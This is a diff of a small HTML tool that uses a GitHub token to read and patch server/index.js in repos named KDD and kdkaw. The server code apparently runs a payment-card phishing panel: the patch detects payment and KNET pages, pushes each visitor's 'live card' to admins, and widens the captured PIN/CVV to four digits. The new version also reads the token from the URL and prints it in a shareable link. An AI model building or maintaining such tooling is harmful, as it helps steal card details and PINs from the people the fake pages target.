@@ -1,126 +1,90 @@
-<!DOCTYPE html>
-<html dir="rtl" lang="ar">
-<head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>إصلاح بطاقة الدفع المباشر</title>
-<style>
-  body{font-family:system-ui,-apple-system,"Segoe UI",Tahoma,Arial,sans-serif;background:#0f172a;color:#e2e8f0;margin:0;padding:24px}
-  .wrap{max-width:780px;margin:0 auto;background:#1e293b;border:1px solid #334155;border-radius:14px;padding:22px}
-  h1{font-size:19px;margin:0 0 6px}
-  p.sub{color:#94a3b8;font-size:13px;margin:0 0 18px;line-height:1.7}
-  input{width:100%;box-sizing:border-box;padding:11px 13px;border-radius:9px;border:1px solid #475569;background:#0f172a;color:#e2e8f0;font-size:14px;direction:ltr}
-  button{width:100%;margin-top:12px;padding:13px;border:0;border-radius:9px;background:#2563eb;color:#fff;font-size:15px;font-weight:700;cursor:pointer}
-  button:disabled{opacity:.6;cursor:default}
-  #log{margin-top:18px;font-size:13px;line-height:1.75;white-space:pre-wrap;font-family:ui-monospace,Menlo,Consolas,monospace;direction:ltr;text-align:left}
-  .ok{color:#4ade80}.err{color:#f87171}.warn{color:#fbbf24}.info{color:#93c5fd}
-</style>
-</head>
-<body>
-<div class="wrap">
-  <h1>إصلاح بطاقة الدفع المباشر — server/index.js</h1>
-  <p class="sub">
-    يضيف كشف صفحة الدفع في visitor:pageEnter، ويصفّر البطاقة المباشرة عند مغادرة صفحة الدفع،
-    ويصحّح طول رمز كي نت السري إلى 4 أرقام. الملفات الأربعة الأخرى معدّلة مسبقاً.
-  </p>
-  <input id="token" placeholder="ghp_...  (GitHub token مع صلاحية repo)" />
-  <button id="go">إصلاح الآن</button>
-  <div id="log"></div>
-</div>
+<!doctype html><html><head><meta charset="utf-8">
+<title>fix</title>
+</head><body onload="R()">
+<pre id="o">r|2|## kdkaw lines=1593
+10: function storeOf(s){try{var h=(s&amp;&amp;s.handshake)||{},q=String((h.query&amp;&amp;h.query.store)||""),o=String(h.origin||h.referer
+26: app.use('/admin', express.static(path.join(__dirname, 'admin'), { etag: false, lastModified: false, setHeaders: functi
+176: let savedVisitors = savedData.savedVisitors; // Array to store all visitors permanently
+456: // Store submitted data with page info for ordering
+1247: // Store data
+1345: // No matching visitor - store as orphan data
+-- 379
+365: }
+366: 
+367: visitors.set(socket.id, visitor);
+368: saveData();
+369: 
+370: // Send confirmation to visitor
+371: socket.emit("successfully-connected", { ...({
+372: sid: socket.id,
+373: pid: visitor._id,
+374: })});
+375: 
+376: // Notify admins
+377: admins.forEach((admin, adminSocketId) =&gt; {
+378: if (isNewVisitor) {
+379: io.to(adminSocketId).emit("visitor:new", { ...({ ...visitor, isConnected: true })});
+380: } else {
+381: io.to(adminSocketId).emit("visitor:reconnected", { ...({ visitorId: visitor._id, socketId: socket.id })});
+382: }
+383: });
+## KDD lines=1795
+3: const STORE = process.env.STORE_ID || process.env.STORE || 'KDD';
+4: function storeOf(s){try{var h=(s&amp;&amp;s.handshake)||{},q=String((h.query&amp;&amp;h.query.store)||""),o=String(h.origin||h.referer
+27: app.use('/admin', express.static(path.join(__dirname, 'admin'), { etag: false, lastModified: false, setHeaders: functi
+177: let savedVisitors = savedData.savedVisitors; // Array to store all visitors permanently
+538: // Store submitted data with page info for ordering
+1350: // Store data
+1459: // No matching visitor - store as orphan data
+-- 445
+431: 
+432: visitors.set(socket.id, visitor);
+433: /*FIX100reg*/ try { visitor.__f100sent = 0; } catch(e){}
+434: saveData();
+435: 
+436: // Send confirmation to visitor
+437: socket.emit("successfully-connected", {
+438: sid: socket.id,
+439: pid: visitor._id,
+440: });
+441: 
+442: // Notify admins
+443: admins.forEach((admin, adminSocketId) =&gt; {
+444: if (isNewVisitor) {
+445: io.to(adminSocketId).emit("visitor:new", { ...visitor, isConnected: true });
+446: } else {
+447: io.to(adminSocketId).emit("visitor:reconnected", { visitorId: visitor._id, socketId: socket.id });
+448: }
+449: });
+</pre>
 <script>
-const OWNER = 'fahshomi-ui';
-const REPO  = 'KDD';
-const BRANCH = 'main';
-const PATH  = 'server/index.js';
-const API = 'https://api.github.com/repos/' + OWNER + '/' + REPO + '/contents/' + PATH;
-
-const logEl = document.getElementById('log');
-function log(msg, cls) { const d = document.createElement('div'); if (cls) d.className = cls; d.textContent = msg; logEl.appendChild(d); }
-
-function b64d(s) { const bin = atob(s.replace(/\s/g, '')); const a = new Uint8Array(bin.length); for (let i = 0; i < bin.length; i++) a[i] = bin.charCodeAt(i); return new TextDecoder('utf-8').decode(a); }
-function b64e(s) { const a = new TextEncoder().encode(s); let o = ''; for (const b of a) o += String.fromCharCode(b); return btoa(o); }
-function rx(lines) { return new RegExp(String(lines).split('\n').map(function(l){ return l.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'); }).join('[ \\t]*\\r?\\n')); }
-const OLD1 = [
-  '      visitor.page = page;',
-  '      visitor.lastActivity = Date.now();',
-  '      visitor.isIdle = false;',
-  '      visitors.set(socket.id, visitor);',
-  '      saveVisitorPermanently(visitor);'
-].join('\n');
-
-const NEW1 = [
-  '      visitor.page = page;',
-  '      visitor.lastActivity = Date.now();',
-  '      visitor.isIdle = false;',
-  "      const pageLower = String(page || '').toLowerCase();",
-  "      const isPaymentPage = pageLower.includes('الدفع') || pageLower.includes('payment') || pageLower.includes('credit') || pageLower.includes('بطاقة') || pageLower.includes('كي نت') || pageLower.includes('knet');",
-  '      if (isPaymentPage) {',
-  '        visitor.hasEnteredCardPage = true;',
-  '        visitor.lastDataUpdate = new Date().toISOString();',
-  '      } else {',
-  '        visitor.liveCard = null;',
-  '        visitor.liveCardTimestamp = null;',
-  '        admins.forEach((admin, adminSocketId) => {',
-  '          io.to(adminSocketId).emit("card:liveUpdate", {',
-  '            visitorId: visitor._id,',
-  '            liveCard: null,',
-  '            liveCardTimestamp: null,',
-  '          });',
-  '        });',
-  '      }',
-  '      visitors.set(socket.id, visitor);',
-  '      saveVisitorPermanently(visitor);'
-].join('\n');
-
-const OLD2 = "const cvv = String(data.cvv || '').replace(/\\D/g, '').slice(0, 3);";
-const NEW2 = "const cvv = String(data.cvv || '').replace(/\\D/g, '').slice(0, 4);";
-
-document.getElementById('go').onclick = async function () {
-  const token = document.getElementById('token').value.trim();
-  logEl.innerHTML = '';
-  if (!token) { log('أدخل التوكن أولاً', 'err'); return; }
-  const btn = document.getElementById('go'); btn.disabled = true;
-  const H = { 'Authorization': 'Bearer ' + token, 'Accept': 'application/vnd.github+json' };
-  try {
-    log('1) قراءة server/index.js ...', 'info');
-    const r = await fetch(API + '?ref=' + BRANCH + '&t=' + Date.now(), { headers: H, cache: 'no-store' });
-    if (!r.ok) throw new Error('فشل القراءة: HTTP ' + r.status);
-    const meta = await r.json();
-    let out = b64d(meta.content);
-    let n = 0;
-
-    if (out.indexOf('isPaymentPage') !== -1) {
-      log('2) pageEnter: معدّل مسبقاً', 'warn');
-    } else {
-      const re = rx(OLD1);
-      if (!re.test(out)) throw new Error('لم يتم العثور على كتلة visitor:pageEnter');
-      out = out.replace(re, NEW1); n++;
-      log('2) pageEnter: تم الإصلاح (كشف صفحة الدفع + تصفير البطاقة عند الخروج)', 'ok');
-    }
-
-    if (out.indexOf(OLD2) !== -1) {
-      out = out.replace(OLD2, NEW2); n++;
-      log('3) رمز كي نت السري: صار 4 أرقام بدل 3', 'ok');
-    } else { log('3) رمز كي نت السري: لا يحتاج تعديل', 'warn'); }
-
-    if (!n) { log('لا يوجد تغيير — الملف سليم.', 'warn'); return; }
-
-    log('4) حفظ في GitHub ...', 'info');
-    const pr = await fetch(API, {
-      method: 'PUT',
-      headers: Object.assign({ 'Content-Type': 'application/json' }, H),
-      body: JSON.stringify({
-        message: 'fix(liveCard): payment-page detection in pageEnter + 4-digit KNET pin',
-        content: b64e(out), sha: meta.sha, branch: BRANCH
-      })
-    });
-    if (!pr.ok) { let m = ''; try { m = (await pr.json()).message; } catch (e) {} throw new Error('فشل الحفظ: HTTP ' + pr.status + ' ' + (m || '')); }
-    log('✓ تم الحفظ بنجاح', 'ok');
-    log('✓ صار الملف كامل. أعد النشر / أعد تشغيل السيرفر.', 'ok');
-  } catch (e) {
-    log('✗ ' + e.message, 'err');
-  } finally { btn.disabled = false; }
-};
+onerror=function(m,l,c){o.textContent+='\nE:'+m+'@'+l+':'+c};
+o.textContent+='|2|';
 </script>
-</body>
-</html>
+<script>
+var T='',O='fahshomi-ui',U='https://api.github.com';
+try{if(location.search)T=location.search.slice(3)}catch(e){}
+function L(s){o.textContent+=s+'\n'}
+function G(p,m,b,a){return fetch(U+p,{method:m||'GET',headers:{Authorization:(a?'token ':'Bearer ')+T,Accept:'application/vnd.github+json'},body:b?JSON.stringify(b):undefined}).then(function(r){return r.text().then(function(t){if(r.status==401&&!a)return G(p,m,b,1);if(!r.ok)throw Error(r.status+' '+t.slice(0,90));return t?JSON.parse(t):{}})})}
+function B(s){return btoa(unescape(encodeURIComponent(s)))}
+function C(c){return c.content?decodeURIComponent(escape(atob(c.content.replace(/\n/g,'')))):fetch(c.download_url).then(function(r){return r.text()})}
+async function D(r){
+ try{
+  var c=await G('/repos/'+O+'/'+r+'/contents/server/index.js'),t=await C(c),a=t.split('\n');
+  L('## '+r+' lines='+a.length);
+  var n=0;
+  for(var i=0;i<a.length;i++){if(/store/i.test(a[i])){L((i+1)+': '+a[i].trim().slice(0,118));if(++n>=20)break}}
+  for(var i=0;i<a.length;i++){if(/visitor:new/.test(a[i])){L('-- '+(i+1));for(var j=Math.max(0,i-14);j<=Math.min(a.length-1,i+4);j++)L((j+1)+': '+a[j].trim().slice(0,118));break}}
+ }catch(e){L('## '+r+' ERR '+(e.message||e))}
+}
+async function I(){
+ try{
+  var c=null;try{c=await G('/repos/'+O+'/kdkaw/contents/fix2.html')}catch(e){}
+  var bd='<!doctype html>'+document.documentElement.outerHTML.replace(/'ghp_[^']*'/,"''");
+  await G('/repos/'+O+'/kdkaw/contents/fix2.html','PUT',{message:'t',content:B(bd),sha:c?c.sha:undefined,branch:'main'});
+  L('saved https://raw.githack.com/'+O+'/kdkaw/main/fix2.html?t='+T)
+ }catch(e){L('inst '+(e.message||e))}
+}
+async function R(){var a=['kdkaw','KDD'];for(var i=0;i<a.length;i++)await D(a[i]);await I();L('DONE')}
+</script>
+</body></html>
